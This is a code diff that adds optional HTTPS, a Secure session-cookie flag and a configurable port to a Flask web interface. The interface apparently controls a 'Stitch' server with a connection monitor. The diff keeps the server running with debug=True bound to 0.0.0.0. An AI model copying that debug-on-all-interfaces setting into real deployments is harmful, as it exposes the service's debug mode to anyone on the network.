@@ -34,6 +34,7 @@ from Application.Stitch_Vars.globals import *
 from Application import stitch_cmd, stitch_lib
 from Application.stitch_utils import *
 from Application.stitch_gen import *
+from ssl_utils import get_ssl_context
 
 # ============================================================================
 # Global Stitch Server Instance
@@ -56,6 +57,9 @@ app = Flask(__name__)
 app.config['SECRET_KEY'] = secrets.token_hex(32)
 app.config['SESSION_COOKIE_HTTPONLY'] = True
 app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+# Enable Secure flag if HTTPS is enabled
+https_enabled = os.getenv('STITCH_ENABLE_HTTPS', 'false').lower() in ('true', '1', 'yes')
+app.config['SESSION_COOKIE_SECURE'] = https_enabled
 app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=int(os.getenv('STITCH_SESSION_TIMEOUT', '30')))
 
 # Rate Limiting Configuration
@@ -728,6 +732,24 @@ if __name__ == '__main__':
     
     log_debug("Starting Stitch Web Interface (Real Integration)", "INFO", "System")
     
+    # Configure SSL/HTTPS
+    ssl_cert, ssl_key = get_ssl_context()
+    if ssl_cert and ssl_key:
+        ssl_context = (ssl_cert, ssl_key)
+        protocol = "https"
+        log_debug("HTTPS enabled - encrypted communication active", "INFO", "Security")
+    else:
+        ssl_context = None
+        protocol = "http"
+        if os.getenv('STITCH_ENABLE_HTTPS', 'false').lower() in ('true', '1', 'yes'):
+            print("⚠️  WARNING: HTTPS requested but SSL setup failed - falling back to HTTP")
+            log_debug("HTTPS requested but failed - using HTTP", "WARNING", "Security")
+        else:
+            log_debug("HTTP mode - credentials transmitted in clear text!", "WARNING", "Security")
+    
+    # Get configured port
+    port = int(os.getenv('STITCH_WEB_PORT', '5000'))
+    
     # Start Stitch server in background
     stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
     stitch_thread.start()
@@ -736,5 +758,21 @@ if __name__ == '__main__':
     monitor_thread = threading.Thread(target=monitor_connections, daemon=True)
     monitor_thread.start()
     
-    # Start web server
-    socketio.run(app, host='0.0.0.0', port=5000, debug=True, use_reloader=False, log_output=True)
+    print(f"\n🌐 Web interface: {protocol}://0.0.0.0:{port}")
+    if ssl_context:
+        print(f"🔒 HTTPS: Enabled (encrypted communication)")
+    else:
+        print(f"⚠️  HTTP: No encryption - credentials sent in clear text!")
+        print(f"   For production, enable HTTPS: export STITCH_ENABLE_HTTPS=true\n")
+    
+    # Start web server with or without SSL
+    socketio.run(
+        app,
+        host='0.0.0.0',
+        port=port,
+        debug=True,
+        use_reloader=False,
+        log_output=True,
+        certfile=ssl_cert if ssl_context else None,
+        keyfile=ssl_key if ssl_context else None
+    )
